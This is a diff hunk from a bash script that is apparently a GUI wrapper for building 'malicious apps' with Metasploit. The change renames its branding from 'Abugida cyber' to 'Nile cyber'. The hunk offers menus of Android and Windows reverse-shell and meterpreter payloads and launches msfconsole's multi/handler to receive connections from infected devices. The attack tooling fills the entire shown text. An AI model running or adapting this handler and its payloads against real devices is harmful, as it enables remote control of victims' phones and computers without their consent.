@@ -47,16 +47,16 @@ function payload_name()
 #function payload
 function get_payload()
 {
-  PAYLOAD=$(zenity --list --title " Abugida cyber" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
+  PAYLOAD=$(zenity --list --title " Nile cyber" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
 }
 function get_payload1()
 {
-  PAYLOAD=$(zenity --list --title " Abugida cyber" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "windows/shell/reverse_tcp" FALSE "windows/shell/reverse_http" FALSE "windows/shell/reverse_https" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter_reverse_tcp" FALSE "windows/meterpreter_reverse_http" FALSE "windows/meterpreter_reverse_https" FALSE "windows/meterpreter_reverse_ipv6_tcp " --width 400 --height 400 2> /dev/null)
+  PAYLOAD=$(zenity --list --title " Nile cyber" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "windows/shell/reverse_tcp" FALSE "windows/shell/reverse_http" FALSE "windows/shell/reverse_https" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter_reverse_tcp" FALSE "windows/meterpreter_reverse_http" FALSE "windows/meterpreter_reverse_https" FALSE "windows/meterpreter_reverse_ipv6_tcp " --width 400 --height 400 2> /dev/null)
 }
 
 function xterm()
 {
-xterm -T "Abugida malcious app MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
+xterm -T "Nile malcious app MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
 } 
 #function spinlong ()
 #{
